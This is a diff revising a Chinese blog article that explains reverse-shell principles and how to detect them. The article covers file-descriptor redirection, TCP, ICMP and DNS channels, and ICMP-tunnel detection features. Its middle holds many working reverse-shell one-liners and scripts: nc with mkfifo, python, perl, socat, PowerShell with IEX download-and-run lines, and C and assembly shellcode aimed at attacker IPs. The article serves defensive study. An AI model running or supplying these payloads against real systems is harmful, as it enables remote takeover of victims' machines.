@@ -75,24 +75,21 @@
 
   - [0x5：网络层反弹shell通信特征检测](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_3)
 
-[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)
 
-# 1. 反弹Shell的概念本质
 
-所谓的反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。 
+# 1. 反弹Shell的概念
+
+**反弹shell的本质**：就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。
+
+**反弹shell的结果**：一个client上的bash进程 可以和 server上的进程通信。
+
+**而反弹shell的检测，本质上就是检测 shell进程（如bash）的输入输出是否来自于一个远程的server。**
 
 ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215220831022-201658057.png)
 
-本文会先分别讨论：
-
-- 命令执行（system executor）
-- 网络通信（network api）
-
-这两个基础原子概念，然后在之后的章节中用组合的方式来呈现现在主流的反弹shell技术方式及其原理，用这种横向和纵向拆分的方式来帮助读者朋友更好地理解反弹shell。
-
  
 
-[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)
+
 
 # 2. 网络通信（network api）方式讨论
 
@@ -110,9 +107,14 @@ linux文件描述符可以理解为**linux跟踪打开文件而分配的一个�
 
 ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214103946845-1739367665.png)
 
-进程启动后再打开新的文件，描述符会自动依次增加。每一个新进程都会继承其父进程的文件描述符，因此所有的shell命令（本质上也是启动新进程），都会默认有三个文件描述符。
+### **注意：**
 
-**Linux一切皆文件**，键盘、显示器设备也是文件，因此他们的输入输出也是由文件描述符控制。如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。
+（1）以后再打开文件，描述符可以依次增加
+（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。
+
+**文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）**
+
+一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。
 
 ### 2. 重定向
 
@@ -125,109 +127,122 @@ linux文件描述符可以理解为**linux跟踪打开文件而分配的一个�
   - “>”
   - “>>”
 
-bash在执行一条指令的时候，首先会检查命令中是否存在文件描述符重定向的符号，如果存在那么**首先将文件描述符重定向（预处理）**，然后在把重定向去掉，继续执行指令。如果指令中存在多个重定向，重定向**从左向右解析**。
+**重点：**
 
-#### 1）输入重定向
+1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令
 
-```
-[n]< word 
-（注意[n]与<之间没有空格）
-```
+2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）
 
-说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）。
+3.< 是对标准输入 0 重定向 ，> 是对标准输出 1 重定向
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110352181-1114204290.png)
+4.**再强调一下，重定向就是针对文件描述符的操作**
 
-解析器解析到 "<" 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。
+#### **2.1.输入重定向**
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110751434-1161244658.png)
+格式： [n]< word **（注意[n]与<之间没有空格）**
 
-#### 2）输出重定向
+说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）
 
-```
-[n]> word
-```
+[![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110352181-1114204290.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d749a4e2-9c80-1.png)
 
-说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）。
+](https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d7566fc4-9c80-1.png)
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110913956-79867805.png) 
+解释: 解析器解析到 "<" 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(**有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入**)
 
-上述指令将文件描述符1（标准输出）重定向到了指定文件。
+图示:
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111019277-654958095.png)
+[[![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110751434-1161244658.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d763ff72-9c80-1.png)
 
-#### 3）标准输出与标准错误输出重定向
+#### **2.2.输出重定向**
 
-下面3种形式完全等价，
+格式： [n]> word
 
-```
-&> word 
->& word
-> word 2>&1：将标准错误输出复制到标准输出
-```
+![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110913956-79867805.png)https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d77f7b1c-9c80-1.png)
 
-说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开）。
+说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111747902-1023189028.png) 
+图示：
+
+[![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111019277-654958095.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d79014c2-9c80-1.png)
+
+#### **2.3.标准输出与标准错误输出重定向**
+
+格式： &> word >& word
+
+说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 > word 2>&1 (2>&1 是将标准错误输出复制到标准输出，&是为了区分文件1和文件描述符1的，详细的介绍后面会有)
+
+[![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111747902-1023189028.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d79df60a-9c80-1.png)
 
 解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111821295-137624665.png)
+图示：
 
-#### 4）文件描述符的复制
+[![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111821295-137624665.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7abf9e4-9c80-1.png)
 
-```
-[n]<&[m] 
-n]>&[m] 
-注意：这里所有字符之间不要有空格
-```
+#### **2.4.文件描述符的复制**
 
-- 这两个指令都是将文件描述符 n 复制到 m ，两者的区别是
-  - [n]<&[m] ：以只读的形式打开
-  - n]>&[m] ：以写的形式打开
-- 这里的 & 目的是为了区分数字名字的文件和文件描述符，如果没有 & 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符
+格式： [n]<&[m] / [n]>&[m] **(这里所有字符之间不要有空格)**
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113225130-460473756.png)
+说明：
 
-注意，重定向符号的顺序不能随便换，因为系统是从左到右执行。我们来分析上面指令结果出现的原理，
+1）这里两个**都是将文件描述符 n 复制到 m** ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开
 
-**首先解析器解析到 2>&1**
+**因此 0<&1 和 0>&1 是完全等价的（读/写方式打开对其没有任何影响）**
+
+2）这里的& 目的是为了区分数字名字的文件和文件描述符，如果没有& 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符
+
+这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中
+
+**重点：**
+
+之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子
+
+(1)cmd > file 2>&1
+(2)cmd 2>&1 >file
+
+与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程
+
+**1.首先解析器解析到 2>&1**
 
 ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113307927-498723848.png)
 
-**解析器再向后解析到 “>”** 
+**2.解析器再向后解析到 “>”**
 
-![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113402709-148725631.png)
+[![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113402709-148725631.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7cdb7be-9c80-1.png)
 
-#### 5）exec 绑定重定向
+#### **2.5.exec 绑定重定向**
 
-```
-exec [n] <> file/[n]：以读写方式打开file指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入
-exec [n] < file/[n] 
-exec [n] > file/[n]
-```
+格式：exec [n] </> file/[n]
 
-使用 exec 指令，可以让重定向在接下来的会话中（多条指令）持续有效。
+上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令
+
+**重点：**
+
+格式： [n]<>word
+
+说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。
 
 ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114049434-1826483874.png)
 
- ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114254852-1959897938.png)
+​                                                             ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114254852-1959897938.png)
 
 ## 0x2：通过建立socket tcp连接实现网络通信【4层协议】 
 
 ## 0x3：使用ICMP实现网络通信【4层协议】
 
+**ICMP隐蔽隧道的原理，改变操作系统默认填充的Data，替换成我们自己的数据。**
+比如使用icmp隧道可以构造一个包含有www.facebook.com字符串的自定义data的包，如下图所示：
+
+![图片名称](https://blog.riskivy.com/wp-content/uploads/2019/04/p5.png)
+
 ## 0x4：使用DNS实现网络通信【7层协议】
 
-**Relevant Link:** 
-
-```
-https://xz.aliyun.com/t/2548 
-```
-
- 
-
-[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)
+- dns（udp直连模式）
+  - control server将指令封装成dns包格式，通过udp53直接发送给client
+  - victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server
+- dns（authoritative DNS server转发模式）
+  - victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上
+  - control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。 
 
 # 3. 命令执行（system executor）方式讨论
 
@@ -247,7 +262,7 @@ echo "hello" | cat
 
  
 
-[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)
+
 
 # 4. 反弹Shell攻击组合方式讨论
 
@@ -330,8 +345,6 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999
 
 ### 4. Xterm 
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 ```
 # 在主控端配置
 # 开启Xserver：　　# TCP 6001
@@ -350,7 +363,7 @@ xterm -display attackerip:1
 $ DISPLAY=attackerip:0 xterm
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ## 0x3：“管道符”+ “socket网络通信”实现bash反弹shell
 
@@ -387,7 +400,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 110.211.55.2 7777 >/tmp/f
 
 ### 1. python反弹shell
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
@@ -402,7 +415,7 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(['/bin/bash','-i'])
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 - 使用duo2方法将第二个形参（文件描述符）指向第一个形参（socket链接）
   - os.dup2(s.fileno(),0)
@@ -411,8 +424,6 @@ p=subprocess.call(['/bin/bash','-i'])
 - 使用os的subprocess在本地开启一个子进程，启动bash交互模式，标准输入、标准输出、标准错误输出被重定向到了远程
 
 ### 2. perl反弹shell 
-
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
 
 ```
 perl -e 'use Socket;$i=”10.211.55.2";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -429,8 +440,6 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){
     exec("/bin/sh -i")
 }
 ```
-
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
 
 ### 3. ruby反弹shell
 
@@ -466,8 +475,6 @@ p.waitFor()
 
 ### 8. gawk
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 ```
 #!/usr/bin/gawk -f
 
@@ -491,15 +498,11 @@ BEGIN {
 }
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 ### 9. powershell反弹shell
 
 powershell反弹shell本质上是一些多功能代码集合，通过调用windows提供的api接口实现网络通信和指令解析执行的功能。
 
 #### 1）powercat反弹shell
-
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
 
 ```
 # 攻击者(192.168.159.134)开启监听：
@@ -513,15 +516,11 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString
 powercat -c 192.168.159.134 -p 6666 -e cmd
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 #### 2）nishang反弹shell
 
 Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。
 
 **## Reverse TCP shell**
-
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
 
 ```
 # 攻击者(192.168.159.134)开启监听：
@@ -536,8 +535,6 @@ Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 **## Reverse UDP shell**
 
 ```
@@ -551,8 +548,6 @@ Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53
 
 **## Reverse ICMP shell**
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 ```
 # 首先攻击端下载icmpsh_m.py文件
 https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1
@@ -565,13 +560,9 @@ python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 #### 3）自定义powershell函数反弹shell
 
 利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell。
-
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
 
 ```
 # 攻击者(192.168.159.134) 开启监听 
@@ -585,8 +576,6 @@ $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]:
 $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 #### 4）Empire 结合office反弹shell
 
 Empire(https://github.com/EmpireProject/Empire)基于powershell的后渗透攻击框架，可利用office宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell。
@@ -594,11 +583,7 @@ Empire(https://github.com/EmpireProject/Empire)基于powershell的后渗透攻�
 - 利用office宏反弹shell 
 - 利用office OLE对象插入bat文件反弹shell
 
-**Relevant Link:** 
 
-```
-https://www.anquanke.com/post/id/99793
-```
 
 ### 10. regsvr32反弹shell
 
@@ -617,8 +602,6 @@ https://www.anquanke.com/post/id/99793
 通过shellcode直接调用glibc或者syscall完成反弹shell。 
 
 #### 1）C代码
-
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
 
 ```
 #include<sys/socket.h>   //构造socket所需的库
@@ -644,11 +627,7 @@ int main()
 }
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 #### 2）汇编语言代码
-
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
 
 ```
 section .text
@@ -712,8 +691,6 @@ mov al,0x0b
 int 0x80
 ```
 
-[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
-
 注意，push long 0x6400A8C0 这里就是IP地址，出现了00，在网络传输中会被截断。
 
 ```
@@ -748,18 +725,7 @@ PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包
   - victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上
   - control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。 
 
-**Relevant Link:** 
-
-```
-https://xz.aliyun.com/t/2549
-https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html
-https://www.cnblogs.com/shanmao/archive/2012/12/26/2834210.html
-https://xz.aliyun.com/t/6727
-```
-
  
-
-[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)
 
 # 5. 反弹Shell检测思路
 
@@ -817,3 +783,62 @@ https://xz.aliyun.com/t/6727
 
 针对DNS流量进行分析，判断关联进程是否开启/dev/net/tun，或者/dev/net/tap隧道等等。
 
+
+
+#### 4.3 ICMP反弹shell特征检测
+
+对于正常的ping命令产生的数据，有以下特点：
+
+● 每秒发送的数据包个数比较少，通常每秒最多只会发送两个数据包；
+
+● 请求数据包与对应的响应数据包内容一样；
+
+● 数据包中payload的大小固定，windows下为32bytes，linux下为48bytes；
+
+● 数据包中payload的内容固定，windows下为abcdefghijklmnopqrstuvwabcdefghi，linux下为!”#$%&’()+,-./01234567，如果指定ping发送的长度，则为不断重复的固定字符串；
+
+● type类型只有2种，0和8。0为请求数据，8为响应数据。
+
+对于ICMP隧道产生的数据，有以下特点：
+
+● 每秒发送的数据包个数比较多，在同一时间会产生成百上千个 ICMP 数据包；
+
+● 请求数据包与对应的响应数据包内容不一样；
+
+● 数据包中 payload的大小可以是任意大小；
+
+● 存在一些type为13/15/17的带payload的畸形数据包；
+
+● 个别ICMP隧道工具产生的数据包内容前面会增加 ‘TUNL’ 标记以用于识别隧道。
+
+因此，根据正常ping和ICMP隧道产生的数据包的特点，可以通过以下几点特征检测ICMP隧道:
+
+● 检测同一来源数据包的数量。正常ping每秒只会发送2个数据包，而ICMP隧道可以每秒发送很多个；
+
+● 检测数据包中 payload 的大小。正常ping产生的数据包payload的大小为固定，而ICMP隧道数据包大小可以任意；
+
+● 检测响应数据包中 payload 跟请求数据包是否不一致。正常ping产生的数据包请求响应内容一致，而ICMP隧道请求响应数据包可以一致，也可以不一致；
+
+● 检测数据包中 payload 的内容。正常ping产生的payload为固定字符串，ICMP隧道的payload可以为任意；
+
+● 检测 ICMP 数据包的type是否为0和8。正常ping产生的带payload的数据包，type只有0和8，ICMP隧道的type可以为13/15/17。
+
+![图片名称](https://blog.riskivy.com/wp-content/uploads/2019/04/p6.png)
+
+具体实现可参考https://blog.riskivy.com/%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90%E7%9A%84icmp%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/
+
+
+
+
+
+## 四、参考链接
+
+1. [郑瀚Andrew](https://home.cnblogs.com/u/LittleHann/)的 [反弹Shell原理及检测技术研究](https://www.cnblogs.com/LittleHann/p/12038070.html)
+2. https://thinkycx.me/2019-07-06-how-to-detect-a-reverse-shell.html
+3. https://github.com/zhanghaoyil/seesaw
+4. https://www.freebuf.com/articles/system/187584.html
+5. https://www.anquanke.com/post/id/99793
+6. https://xz.aliyun.com/t/2549
+7. https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html
+8. https://www.cnblogs.com/shanmao/archive/2012/12/26/2834210.html
+9. https://xz.aliyun.com/t/6727
